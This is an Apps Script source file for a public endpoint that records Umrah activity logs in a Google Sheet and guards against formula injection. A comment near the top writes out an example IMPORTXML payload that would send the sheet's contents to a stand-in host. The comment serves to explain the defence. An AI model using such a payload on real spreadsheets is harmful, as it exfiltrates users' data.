/**
 * ============================================================
 * UMRAH ACTIVITY LOG — Google Apps Script
 * ============================================================
 */
const SHEET_NAME = 'Umrah Activity Log';

/**
 * This endpoint is public: anyone who has the URL can POST to it. Everything
 * that arrives is therefore untrusted. A cell whose text begins with = + - @
 * is evaluated by Sheets as a formula, so a submitted value such as
 *   =IMPORTXML("https://example.com/?d="&CONCATENATE(A1:I1),"//a")
 * would run when this spreadsheet is opened and send its contents away.
 * Every value is prefixed with an apostrophe in that case so it stays text.
 */
function cell(value) {
  var s = (value === null || value === undefined) ? '' : String(value);
  if (s.length > 500) s = s.slice(0, 500);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({ status: 'ok', message: 'Umrah Log API is running. Use POST to submit logs.' })).setMimeType(ContentService.MimeType.JSON);
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);
    const ss = getOrCreateSpreadsheet();
    const sheet = ss.getSheetByName('Logs') || ss.insertSheet('Logs');
    
    if (sheet.getLastRow() === 0) {
      const headers = ['Session ID', 'Umrah Started', 'Log #', 'Timestamp', 'Type', 'Activity', 'Elapsed Duration', 'Total Umrah Duration', 'Gender', 'Total Paused', 'Device Info'];
      sheet.appendRow(headers);
      const headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setFontWeight('bold').setBackground('#1B4332').setFontColor('#FFFFFF');
      sheet.setFrozenRows(1);
    }
    
    const sessionId = cell(data.sessionId || 'N/A');
    const umrahStarted = cell(data.umrahStarted || 'N/A');
    const totalDuration = cell(data.totalDuration || 'N/A');
    const deviceInfo = cell(data.deviceInfo || 'N/A');
    const userGender = cell(data.userGender || 'N/A');
    const totalPaused = cell(data.totalPausedTime || 'N/A');
    
    const logs = Array.isArray(data.logs) ? data.logs.slice(0, 500) : [];
    logs.forEach((log, index) => {
      log = (log && typeof log === 'object') ? log : {};
      sheet.appendRow([sessionId, umrahStarted, index + 1, cell(log.time), cell(log.type), cell(log.activity), cell(log.duration), totalDuration, userGender, totalPaused, deviceInfo]);
    });
    
    writeSummary(ss, data);
    // The spreadsheet's URL is not returned: any caller could ask for it.
    return ContentService.createTextOutput(JSON.stringify({ status: 'success', message: `Logged ${logs.length} entries` })).setMimeType(ContentService.MimeType.JSON);
      
  } catch (error) {
    // The real error goes to the script's own log, not back to the caller.
    console.error(error);
    return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: 'Could not save the log.' })).setMimeType(ContentService.MimeType.JSON);
  }
}

function writeSummary(ss, data) {
  let summarySheet = ss.getSheetByName('Summary');
  if (!summarySheet) {
    summarySheet = ss.insertSheet('Summary');
    const headers = ['Date', 'Session ID', 'Umrah Started', 'Total Duration', 'Total Log Entries', 'Tawaf Rounds Logged', 'Saei Rounds Logged', 'Steps Completed', 'Gender', 'Total Paused', 'Device'];
    summarySheet.appendRow(headers);
    summarySheet.getRange(1, 1, 1, headers.length).setFontWeight('bold').setBackground('#C9A84C').setFontColor('#1B4332');
    summarySheet.setFrozenRows(1);
  }
  
  const logs = Array.isArray(data.logs) ? data.logs : [];
  const act = l => (l && typeof l.activity === 'string') ? l.activity : '';
  summarySheet.appendRow([
    new Date().toISOString(), cell(data.sessionId || 'N/A'), cell(data.umrahStarted || 'N/A'), cell(data.totalDuration || 'N/A'),
    logs.length, logs.filter(l => act(l).includes('Tawaf')).length, logs.filter(l => act(l).includes("Sa'i")).length,
    logs.filter(l => l && l.type === 'complete').length, cell(data.userGender || 'N/A'), cell(data.totalPausedTime || 'N/A'), cell(data.deviceInfo || 'N/A')
  ]);
}

function getOrCreateSpreadsheet() {
  const files = DriveApp.getFilesByName(SHEET_NAME);
  if (files.hasNext()) return SpreadsheetApp.open(files.next());
  return SpreadsheetApp.create(SHEET_NAME);
}